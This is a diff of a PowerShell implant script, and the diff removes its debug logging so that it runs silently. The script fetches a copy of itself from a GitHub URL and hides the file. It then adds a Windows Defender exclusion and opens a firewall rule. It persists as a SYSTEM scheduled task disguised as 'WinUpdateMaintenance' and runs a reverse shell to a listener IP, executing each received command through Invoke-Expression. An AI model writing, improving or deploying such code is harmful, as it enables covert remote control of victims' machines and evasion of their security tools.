@@ -1,5 +1,4 @@
 # --- CONFIGURATION ---
-$DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
 $LHOST = "192.168.1.129" # Your listener IP
 $LPORT = 4444          # Your listener Port
 $WorkDir = "C:\Win"
@@ -9,67 +8,46 @@ $TaskName = "WinUpdateMaintenance"
 $RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
 # ---------------------
 
-function Log-Debug {
-    param([string]$Message)
-    if ($DebugMode) {
-        Write-Host "[DEBUG] $(Get-Date -Format 'HH:mm:ss') - $Message" -ForegroundColor Cyan
-    }
-}
-
-Log-Debug "Script initialized. Debug mode is ON."
-
 # 1. SETUP & INSTALLATION
 if (-not (Test-Path $WorkDir)) {
-    Log-Debug "Creating working directory: $WorkDir"
     New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
 }
 
 # Detection: If we aren't running the specific file in C:\Win, we install and hand off
-# Using ${} to ensure the colon in the path doesn't trigger a variable scope error
 if ($PSCommandPath -ne ${FullPath}) {
-    Log-Debug "Loader detected. Installing to ${FullPath}..."
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $webClient = New-Object System.Net.WebClient
         $webClient.DownloadFile($RemoteUrl, ${FullPath})
-        Log-Debug "Download successful."
         
-        if (-not $DebugMode) {
-            attrib +h +s ${FullPath}
-        }
+        attrib +h +s ${FullPath}
 
-        Log-Debug "Launching background process..."
-        # We use single quotes for the outer string to prevent the parser from seeing : as a scope
+        # Launch background process silently
         $ProcArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
         Start-Process powershell.exe -ArgumentList $ProcArgs
         
-        Log-Debug "Releasing terminal. Process will continue in background."
+        # Kill loader session to prevent terminal hang
         Stop-Process -Id $PID 
     } catch {
-        Log-Debug "Installation failed: $($_.Exception.Message)"
+        # Silent failure
     }
 }
 
 # 2. SYSTEM MODIFICATIONS (Requires Admin)
 try {
-    Log-Debug "Updating Defender exclusions..."
     Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
     
-    Log-Debug "Checking Firewall rules..."
     if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
         New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
     }
 } catch {
-    Log-Debug "System mods skipped or failed (Requires Admin)."
+    # Proceed without admin-level mods
 }
 
 # 3. PERSISTENCE
 try {
     if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
-        Log-Debug "Registering Scheduled Task..."
-        # Using concatenation to build the string safely
-        $Arg = '-ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
-        if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
+        $Arg = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
         
         $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
         $Trigger = New-ScheduledTaskTrigger -AtStartup
@@ -77,26 +55,21 @@ try {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
     }
 } catch {
-    Log-Debug "Persistence registration failed."
+    # Silent failure
 }
 
 # 4. THE ENGINE (The Reverse Shell)
-Log-Debug "Entering connection loop. Target: $LHOST:$LPORT"
-
 while ($true) {
     $client = $null
     try {
-        Log-Debug "Attempting connection to $LHOST..."
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
         $stream = $client.GetStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
 
-        Log-Debug "Connected! Sending identification banner."
         $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
         $writer.WriteLine("--- Identity: $(whoami) ---")
-        $writer.WriteLine("--- Path: ${FullPath} ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
@@ -104,7 +77,6 @@ while ($true) {
             $command = $reader.ReadLine()
             
             if ($null -eq $command) { 
-                Log-Debug "Remote host closed the connection."
                 break 
             }
             
@@ -112,7 +84,6 @@ while ($true) {
             if ($command -eq "exit") { break }
             if ($command -eq "") { continue }
 
-            Log-Debug "Executing: $command"
             $output = try {
                 Invoke-Expression $command 2>&1 | Out-String
             } catch {
@@ -123,7 +94,7 @@ while ($true) {
             $writer.Write($output)
         }
     } catch {
-        Log-Debug "Connection failed: $($_.Exception.Message). Retrying in 10s..."
+        # Wait 10 seconds before retrying connection
         Start-Sleep -Seconds 10
     } finally {
         if ($null -ne $client) { $client.Close() }
